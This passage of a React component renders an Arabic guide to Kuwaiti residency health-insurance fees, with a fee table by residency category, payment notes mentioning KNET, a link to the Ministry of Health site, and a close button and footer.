                      <p style={{ marginBottom: 5 }}>6. احتفظ بالإيصال لتقديمه مع معاملة الإقامة.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>الرسوم حسب فئة الإقامة</h2>
                    <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: 14, marginBottom: 30 }}>
                      <thead>
                        <tr style={{ background: '#1076BB', color: '#fff' }}>
                          <th style={{ padding: '10px', border: '1px solid #ddd', textAlign: 'right' }}>فئة الإقامة</th>
                          <th style={{ padding: '10px', border: '1px solid #ddd', textAlign: 'right' }}>الرسوم السنوية</th>
                        </tr>
                      </thead>
                      <tbody>
                        {/* كويتي - 50 د.ك */}
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>18 - إقامة عمل خاص</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>18 - إقامة عمل خاص حكومي</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>19 - شريك تجاري</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>24 - ممول ذاتياً</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>31 - خدمات جليلة ورجال الدين</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>21 - مستثمر</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>25 - مالك العقار</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>22 - التحاق بعائل ابن/ابنه أكبر من 18 سنه</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>18 - رعاة الإبل والأغنام</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>17 - العاملين في الهيئات الدبلوماسية</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>18 - العمال الزراعيين</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>18 - الصيادين العاملين بحرفة صيد الأسماك</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>30 - تعديل الوضع القانوني لذوي الشهيد</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>29 - التحاق بعائل أخ/أخت</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        {/* كويتي - 40 د.ك */}
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>22 - التحاق بعائل زوجة</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>40 د.ك</td></tr>
                        {/* كويتي - 30 د.ك */}
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>22 - التحاق بعائل ابن/ابنه أقل من 18 سنه</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>30 د.ك</td></tr>
                        {/* كويتي - 10 د.ك */}
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>20 - الخادمات (عمالة منزلية) كفالة كويتيين (دفع)</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>10 د.ك</td></tr>
                        {/* كويتي - 5 د.ك */}
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>22 - التحاق بعائل - زوج</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>5 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>22 - التحاق بعائل أبناء الخليجية</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>5 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>29 - التحاق بعائل لغير الزوجة والأبناء</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>5 د.ك</td></tr>
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>20 - الخادمات (عمالة منزلية) كفالة كويتيين (بدون دفع)</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>5 د.ك</td></tr>
                        <tr style={{ background: '#f9f9f9' }}><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>20 - الخادمات (عمالة منزلية) كفالة غير كويتي</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>5 د.ك</td></tr>
                        {/* كويتي - 23 إقامة دراسية */}
                        <tr><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>23 - إقامة دراسية</td><td style={{ padding: '8px 10px', border: '1px solid #ddd' }}>50 د.ك</td></tr>
                        {/* غير كويتي */}
                        <tr style={{ background: '#e8f4fd' }}><td colSpan={2} style={{ padding: '10px', border: '1px solid #ddd', fontWeight: 'bold', textAlign: 'center', color: '#1076BB' }}>غير كويتي: 100 د.ك لجميع فئات الإقامة (ما عدا الخادمات 10 د.ك)</td></tr>
                      </tbody>
                    </table>

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>ملاحظات هامة</h2>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>• يجب أن تتطابق فترة التغطية التأمينية مع فترة الإقامة المطلوبة.</p>
                      <p style={{ marginBottom: 5 }}>• الدفع يتم عبر بطاقة KNET فقط (بطاقة خصم مباشر).</p>
                      <p style={{ marginBottom: 5 }}>• يتم إصدار الإيصال فوراً بعد نجاح عملية الدفع.</p>
                      <p style={{ marginBottom: 5 }}>• يُنصح بالدفع قبل عدة أيام من موعد معاملة الإقامة لتجنب أي تأخير في مزامنة البيانات.</p>
                      <p style={{ marginBottom: 5 }}>• في حال وجود مشكلة في الدفع، تأكد من رصيد البطاقة والحد اليومي للسحب.</p>
                      <p style={{ marginBottom: 5 }}>• للاستفسارات، يمكنك التواصل مع وزارة الصحة عبر الموقع الرسمي <a href="https://www.moh.gov.kw" target="_blank" style={{ color: '#1076BB' }}>www.moh.gov.kw</a>.</p>
                      <p style={{ marginBottom: 5 }}>• الخدمة متاحة على مدار 24 ساعة يومياً.</p>
                    </div>
                  </div>
                </div>
                {/* Bottom Scrollbar Area */}
                <div style={{ background: 'linear-gradient(to bottom, #e0e0e0, #c8c8c8)', height: 16, borderTop: '1px solid #bbb', position: 'relative' }}>
                  <div style={{ position: 'absolute', top: 3, left: '10%', right: '10%', height: 10, background: '#b0b0b0', borderRadius: 5 }} />
                </div>
              </div>
            </div>
            {/* Modal Footer */}
            <div style={{ padding: '10px 20px', borderTop: '1px solid #ddd', textAlign: 'left', direction: 'ltr' }}>
              <button
                onClick={() => setShowGuide(false)}
                style={{
                  background: '#5f9ea0', color: '#fff', border: 'none', padding: '8px 30px',
                  fontSize: 14, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                  fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                }}
              >
                {isAr ? 'اغلق' : 'Close'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Footer */}
      <div style={{ textAlign: 'center', padding: '12px 0', background: '#000', marginTop: 'auto' }}>
        <p style={{ color: '#fff', fontSize: 13, margin: 0 }}>{tx.footer}</p>
      </div>
    </div>
  );
}
